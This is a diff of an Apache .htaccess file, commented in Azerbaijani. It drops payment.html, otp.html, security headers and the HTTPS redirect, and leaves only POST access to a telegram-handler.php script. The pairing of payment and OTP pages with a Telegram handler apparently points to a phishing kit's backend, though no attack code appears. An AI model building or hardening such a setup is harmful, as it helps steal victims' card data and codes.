@@ -1,42 +1,37 @@
-# Xəta göstərmə
+# BÜTÜN FAYLLARA ERİŞİMİ BLOKLA
+Order Deny,Allow
+Deny from all
+
+# YALNIZ telegram-handler.php faylına POST icazəsi
+<Files "telegram-handler.php">
+    <Limit POST>
+        Order Allow,Deny
+        Allow from all
+    </Limit>
+</Files>
+
+# PHP fayllarını gizlət
+<FilesMatch "\.php$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# Konfiq fayllarını blokla
+<FilesMatch "\.(htaccess|htpasswd|ini|log|txt|json|xml|config)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# PHP xətalarını gizlət
 php_flag display_errors off
 php_flag display_startup_errors off
 php_value error_reporting 0
 
-# Header Təhlükəsizlik
-<IfModule mod_headers.c>
-    Header set X-XSS-Protection "1; mode=block"
-    Header set X-Content-Type-Options "nosniff"
-    Header set X-Frame-Options "DENY"
-    Header set Referrer-Policy "no-referrer"
-</IfModule>
-
 # İndeksləməni söndür
 Options -Indexes
 
-# HTTPS-ə yönləndir
-RewriteEngine On
-RewriteCond %{HTTPS} off
-RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
-
-# .php fayllarına BİRBAŞA ERİŞİMİ BLOKLA (index.html xaric)
-<FilesMatch "\.(php|inc|config|json)$">
+# GET sorğularını blokla
+<Limit GET HEAD PUT DELETE>
     Order Allow,Deny
     Deny from all
-</FilesMatch>
-
-# YALNIZ index.html-ə icazə ver
-<Files "index.html">
-    Order Allow,Deny
-    Allow from all
-</Files>
-
-<Files "payment.html">
-    Order Allow,Deny
-    Allow from all
-</Files>
-
-<Files "otp.html">
-    Order Allow,Deny
-    Allow from all
-</Files>
+</Limit>
